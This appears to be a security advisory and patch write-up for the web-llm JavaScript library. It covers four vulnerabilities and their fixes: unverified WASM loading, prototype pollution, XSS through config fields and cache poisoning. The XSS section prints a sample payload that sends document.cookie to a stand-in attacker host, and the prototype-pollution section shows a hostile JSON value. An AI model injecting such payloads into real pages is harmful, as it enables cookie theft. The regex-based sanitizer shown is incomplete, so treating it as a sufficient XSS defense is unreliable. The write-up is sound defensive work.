# Security Hardening for @mlc-ai/web-llm

**Date**: 2026-02-13
**Tracking Issue**: [mlc-ai/web-llm#761](https://github.com/mlc-ai/web-llm/issues/761)
**Author**: Elias Ibrahim (elie.ibrahim@gmail.com)

---

## Summary Table

| Vuln ID | Vulnerability | CWE | CVSS | Fix Location | Fix Function |
|---|---|---|---|---|---|
| WEBLM-001 | RCE via malicious WASM | CWE-94 | 8.8 | `src/utils.ts`, `src/engine.ts`, `src/config.ts` | `verifyIntegrity()` |
| WEBLM-002 | Prototype Pollution via config merge | CWE-1321 | 6.5 | `src/utils.ts`, `src/engine.ts` | `safeDeepMerge()` |
| WEBLM-003 | XSS via unsanitized config fields | CWE-79 | 6.1 | `src/utils.ts`, `src/engine.ts` | `sanitizeConfig()` |
| WEBLM-004 | Persistent RCE via cache poisoning | CWE-349 | 7.5 | `src/utils.ts`, `src/engine.ts` | `verifyIntegrity()` (on load) |

---

## WEBLM-001: Remote Code Execution via Malicious WASM Injection

### Vulnerable Code
In `src/engine.ts`, the `reloadInternal()` function fetches and instantiates a WASM binary from a user-controllable URL with **zero integrity checks**:

```typescript
// VULNERABLE — engine.ts (original)
const wasmSource = await fetchWasmSource();
const wasm = new Uint8Array(wasmSource);
// ^^^ Directly used without any verification
```

An attacker who controls the URL (via compromised repo, MITM, typosquatting, or DNS poisoning) can serve arbitrary WASM that executes in the victim's browser.

### Fix Applied

#### 1. New `ModelRecord` fields — `src/config.ts`
Added optional SRI hash fields so application developers can **pin** known-good hashes at initialization time:

```diff
 export interface ModelRecord {
   model: string;
   model_id: string;
   model_lib: string;
+  /** Optional SRI hash for the WASM file, e.g. "sha384-..." */
+  model_lib_integrity?: string;
+  /** Optional SRI hash for mlc-chat-config.json */
+  chat_config_integrity?: string;
+  /** Optional SRI hash for the tokenizer file */
+  tokenizer_integrity?: string;
 }
```

#### 2. Integrity verification utility — `src/utils.ts`
Added `computeSHA384()` and `verifyIntegrity()`:

```typescript
// HARDENED — utils.ts
async function computeSHA384(buffer: ArrayBuffer): Promise<string> {
  const hashBuffer = await crypto.subtle.digest("SHA-384", buffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashBase64 = btoa(String.fromCharCode(...hashArray));
  return `sha384-${hashBase64}`;
}

export async function verifyIntegrity(
  buffer: ArrayBuffer,
  expectedIntegrity?: string,
): Promise<void> {
  if (!expectedIntegrity) return; // Opt-in: no hash = no check
  const computedIntegrity = await computeSHA384(buffer);
  if (computedIntegrity !== expectedIntegrity) {
    throw new Error(
      `Integrity check failed. Expected ${expectedIntegrity}, got ${computedIntegrity}.`
    );
  }
}
```

#### 3. Enforcement in engine — `src/engine.ts`
```diff
 const wasmSource = await fetchWasmSource();
+// Verify WASM integrity if hash is provided
+await verifyIntegrity(wasmSource, modelRecord.model_lib_integrity);
 const wasm = new Uint8Array(wasmSource);
```

### Why This Works
- The hash is provided by the **application developer** in `AppConfig`, NOT fetched from the untrusted model repo.
- SHA-384 matches the browser's native SRI standard.
- If the hash doesn't match, the WASM is **never instantiated** — the error is thrown before `new Uint8Array()`.

---

## WEBLM-002: Prototype Pollution via Config Deserialization

### Vulnerable Code
In `src/engine.ts`, the original code uses the spread operator on untrusted JSON:

```typescript
// VULNERABLE — engine.ts (original)
const curModelConfig = {
  ...(await configCache.fetchWithCache(configUrl, "json")),
  ...modelRecord.overrides,
  ...chatOpts,
} as ChatConfig;
```

A malicious `mlc-chat-config.json` containing `{"__proto__": {"isAdmin": true}}` would pollute `Object.prototype`, affecting **all objects** in the application.

### Fix Applied

#### 1. Safe merge utility — `src/utils.ts`
```typescript
// HARDENED — utils.ts
export function safeDeepMerge(target: any, source: any): any {
  const isObject = (item: any) =>
    item && typeof item === "object" && !Array.isArray(item);

  if (isObject(target) && isObject(source)) {
    for (const key in source) {
      if (Object.prototype.hasOwnProperty.call(source, key)) {
        // *** CRITICAL: Block prototype pollution vectors ***
        if (key === "__proto__" || key === "constructor" || key === "prototype") {
          continue; // Silently drop dangerous keys
        }
        if (isObject(source[key])) {
          if (!target[key]) Object.assign(target, { [key]: {} });
          safeDeepMerge(target[key], source[key]);
        } else {
          Object.assign(target, { [key]: source[key] });
        }
      }
    }
  }
  return target;
}
```

#### 2. Replacement in engine — `src/engine.ts`
```diff
-const curModelConfig = {
-  ...(await configCache.fetchWithCache(configUrl, "json")),
-  ...modelRecord.overrides,
-  ...chatOpts,
-} as ChatConfig;
+const curModelConfig = sanitizeConfig(
+  safeDeepMerge(
+    safeDeepMerge(safeDeepMerge({}, fetchedConfig), modelRecord.overrides),
+    chatOpts,
+  ),
+) as ChatConfig;
```

### Why This Works
- `safeDeepMerge` uses `Object.prototype.hasOwnProperty.call()` and **explicitly skips** the three dangerous keys (`__proto__`, `constructor`, `prototype`).
- Unlike the spread operator, this function provides a controlled iteration with a deny-list.
- `JSON.parse()` itself does create `__proto__` as a regular property on the parsed object (not on the prototype chain), but the spread operator can propagate it. `safeDeepMerge` blocks this propagation path entirely.

---

## WEBLM-003: Cross-Site Scripting via Malicious Config Fields

### Vulnerable Code
Config fields like `description`, `system_message`, and `name` are fetched from remote JSON and could contain HTML/JS payloads. If any downstream application renders these (e.g., `innerHTML`), XSS fires:

```json
{
  "description": "Helpful model <script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
  "system_message": "<img src=x onerror='alert(document.domain)'>"
}
```

The original code passes these strings through **unchanged**.

### Fix Applied

#### 1. String sanitizer — `src/utils.ts`
```typescript
// HARDENED — utils.ts
export function sanitizeString(str: any): any {
  if (typeof str !== 'string') return str;
  return str
    .replace(/<script\b[^>]*([\s\S]*?)<\/script>/gim, "")  // Strip <script> tags
    .replace(/on\w+="[^"]*"/gim, "")    // Strip onXXX="..." handlers
    .replace(/on\w+='[^']*'/gim, "")    // Strip onXXX='...' handlers
    .replace(/on\w+=[^\s>]+/gim, "");   // Strip onXXX=value handlers
}

export function sanitizeConfig(config: any): any {
  if (!config || typeof config !== 'object') return config;
  const fieldsToSanitize = ['system_message', 'name', 'description', 'model_id'];
  for (const key in config) {
    if (Object.prototype.hasOwnProperty.call(config, key)) {
      if (fieldsToSanitize.includes(key)) {
        config[key] = sanitizeString(config[key]);
      } else if (typeof config[key] === 'object') {
        sanitizeConfig(config[key]);
      }
    }
  }
  return config;
}
```

#### 2. Applied in engine — `src/engine.ts`
The `sanitizeConfig()` call wraps the entire merged config before it's stored:

```typescript
const curModelConfig = sanitizeConfig(
  safeDeepMerge(/* ... */),
) as ChatConfig;
```

### Why This Works
- Strips the two most common DOM XSS vectors: inline `<script>` blocks and `onXXX` event handlers.
- Only sanitizes known text-content fields, preserving numeric/boolean config values.
- Recursive: handles nested objects like `conv_config`.

---

## WEBLM-004: Persistent RCE via Cache Poisoning

### Vulnerable Code
`web-llm` caches WASM in IndexedDB (`ArtifactCacheTensorDB`). On subsequent loads, it reads from cache **without re-verifying integrity**. An attacker who achieves a one-time XSS can replace the cached WASM with a malicious version, creating a persistent backdoor.

### Fix Applied
The `verifyIntegrity()` call in `engine.ts` runs **every time** WASM is loaded — whether from network or from cache. This means:

1. **Fresh fetch**: Hash is computed on the downloaded buffer and compared to `model_lib_integrity`.
2. **Cached load**: The same `fetchWasmSource()` path returns the cached buffer, and `verifyIntegrity()` is called on that buffer too.

If the cache has been poisoned, the hash won't match, and the WASM is rejected before execution.

### Why This Works
- The integrity check is positioned **after** the WASM bytes are obtained but **before** instantiation.
- It doesn't matter whether the bytes came from the network or from IndexedDB — the check is the same.
- The expected hash lives in the **application code** (`AppConfig`), not in the cache itself, so an attacker cannot update both the payload and the hash.

---

## Files Modified

| File | Changes |
|---|---|
| [src/config.ts](file:///d:/WebGPU-Research/web-llm/src/config.ts) | Added `model_lib_integrity`, `chat_config_integrity`, `tokenizer_integrity` to `ModelRecord` |
| [src/utils.ts](file:///d:/WebGPU-Research/web-llm/src/utils.ts) | Added `computeSHA384`, `verifyIntegrity`, `safeDeepMerge`, `sanitizeString`, `sanitizeConfig` |
| [src/engine.ts](file:///d:/WebGPU-Research/web-llm/src/engine.ts) | Replaced spread merge with `safeDeepMerge` + `sanitizeConfig`; added `verifyIntegrity` call after WASM fetch |
| [tests/security.test.ts](file:///d:/WebGPU-Research/web-llm/tests/security.test.ts) | Unit tests for all security functions |

## Usage Example

```typescript
import * as webllm from "@mlc-ai/web-llm";

const appConfig = {
  model_list: [{
    model_id: "Llama-3-8B-Instruct-q4f16_1-MLC",
    model: "https://huggingface.co/mlc-ai/Llama-3-8B-Instruct-q4f16_1-MLC/",
    model_lib: "https://raw.githubusercontent.com/.../Llama-3-8B.wasm",
    // Pin the WASM hash in YOUR application code (not in the remote config!)
    model_lib_integrity: "sha384-YOUR_HASH_HERE"
  }]
};

const engine = await webllm.CreateMLCEngine(
  "Llama-3-8B-Instruct-q4f16_1-MLC",
  { appConfig }
);
```
